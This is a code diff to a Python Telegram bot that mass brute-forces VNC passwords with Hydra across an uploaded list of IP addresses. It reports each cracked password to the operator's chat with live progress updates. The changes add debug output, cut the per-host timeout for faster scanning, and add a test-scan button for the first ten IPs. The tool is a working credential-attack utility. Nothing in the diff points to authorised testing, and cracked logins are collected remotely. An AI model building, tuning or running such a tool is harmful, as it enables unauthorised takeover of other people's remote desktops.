@@ -63,6 +63,8 @@ def check_hydra_installed():
 def check_vnc_with_hydra(ip, port, password_file, threads=4, timeout_sec=300):
     """Check VNC with Hydra"""
     try:
+        print(f"[DEBUG] Checking {ip}:{port}...")
+        
         cmd = [
             'hydra',
             '-P', password_file,
@@ -72,6 +74,8 @@ def check_vnc_with_hydra(ip, port, password_file, threads=4, timeout_sec=300):
             f'vnc://{ip}:{port}'
         ]
         
+        start_time = time.time()
+        
         result = subprocess.run(
             cmd,
             stdout=subprocess.PIPE,
@@ -79,6 +83,9 @@ def check_vnc_with_hydra(ip, port, password_file, threads=4, timeout_sec=300):
             timeout=timeout_sec,
             text=True
         )
+        
+        elapsed = time.time() - start_time
+        print(f"[DEBUG] {ip}:{port} completed in {elapsed:.1f}s")
         
         output = result.stdout + result.stderr
         
@@ -88,14 +95,16 @@ def check_vnc_with_hydra(ip, port, password_file, threads=4, timeout_sec=300):
                     parts = line.split('password:')
                     if len(parts) > 1:
                         password = parts[1].strip().split()[0]
+                        print(f"[HIT] {ip}:{port} | Password: {password}")
                         return True, password
         
         return False, None
         
     except subprocess.TimeoutExpired:
+        print(f"[TIMEOUT] {ip}:{port} after {timeout_sec}s")
         return False, None
     except Exception as e:
-        print(f"Error checking {ip}:{port} - {e}")
+        print(f"[ERROR] {ip}:{port} - {e}")
         return False, None
 
 def send_message_sync(context, chat_id, message):
@@ -150,8 +159,14 @@ def send_hit(context, chat_id, ip, port, password):
     )
     send_message_sync(context, chat_id, message)
 
-def run_scan(context, chat_id):
-    """Run the VNC scan with live progress updates"""
+def run_scan(context, chat_id, max_ips=None):
+    """Run the VNC scan with live progress updates
+    
+    Args:
+        context: Bot context
+        chat_id: Telegram chat ID
+        max_ips: Maximum IPs to check (None = all, for testing use 10)
+    """
     global scan_status
     
     with scan_lock:
@@ -171,6 +186,13 @@ def run_scan(context, chat_id):
         with open(IP_FILE) as f:
             ips = [line.strip() for line in f if line.strip() and not line.startswith('#')]
         
+        # Limit IPs if in test mode
+        if max_ips:
+            ips = ips[:max_ips]
+            test_mode_msg = f" (TEST MODE - First {max_ips} IPs)"
+        else:
+            test_mode_msg = ""
+        
         # Load passwords
         with open(PASS_FILE) as f:
             pass_count = len([line for line in f if line.strip() and not line.startswith('#')])
@@ -179,10 +201,11 @@ def run_scan(context, chat_id):
         
         # Send start message
         start_msg = (
-            f"🚀 <b>Scan Started!</b>\n\n"
+            f"🚀 <b>Scan Started!{test_mode_msg}</b>\n\n"
             f"📊 Total IPs: {len(ips)}\n"
             f"🔐 Passwords: {pass_count}\n"
             f"⚙️ Threads: 4\n"
+            f"⏱ Timeout: 60s per IP\n"
             f"⏰ Started: {datetime.now().strftime('%H:%M:%S')}\n\n"
             f"Live updates every 3 seconds! 📊"
         )
@@ -261,8 +284,8 @@ def run_scan(context, chat_id):
                 
                 last_update_time = current_time
             
-            # Check VNC
-            success, result = check_vnc_with_hydra(ip, port, PASS_FILE, 4, timeout_sec=300)
+            # Check VNC (reduced timeout for faster scanning)
+            success, result = check_vnc_with_hydra(ip, port, PASS_FILE, 4, timeout_sec=60)
             
             if success:
                 scan_status['found'] += 1
@@ -371,6 +394,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("📊 Status", callback_data='status')],
         [InlineKeyboardButton("🚀 Start Scan", callback_data='start_scan')],
+        [InlineKeyboardButton("🧪 Test (First 10 IPs)", callback_data='test_scan')],
         [InlineKeyboardButton("⏹ Stop Scan", callback_data='stop_scan')],
         [InlineKeyboardButton("📥 Get Results", callback_data='get_results')],
         [InlineKeyboardButton("🗑 Clear Files", callback_data='clear_files')]
@@ -547,7 +571,35 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         await query.edit_message_text(
             "🚀 <b>Scan started!</b>\n\n"
-            "You'll receive instant notifications! 🎯",
+            "You'll receive live updates every 3 seconds! 📊",
+            parse_mode='HTML'
+        )
+    
+    elif query.data == 'test_scan':
+        if scan_status['running']:
+            await query.edit_message_text("⚠️ Scan already running!")
+            return
+        
+        if not files_status['ips_uploaded']:
+            await query.edit_message_text("❌ Please upload IPs file first!")
+            return
+        
+        if not files_status['passwords_uploaded']:
+            await query.edit_message_text("❌ Please upload passwords file first!")
+            return
+        
+        # Test scan (first 10 IPs only)
+        thread = threading.Thread(
+            target=run_scan,
+            args=(context, query.from_user.id, 10)  # Test mode: only 10 IPs
+        )
+        thread.daemon = True
+        thread.start()
+        
+        await query.edit_message_text(
+            "🧪 <b>Test scan started!</b>\n\n"
+            "Testing first 10 IPs only...\n"
+            "This will help verify if scanning works!",
             parse_mode='HTML'
         )
     
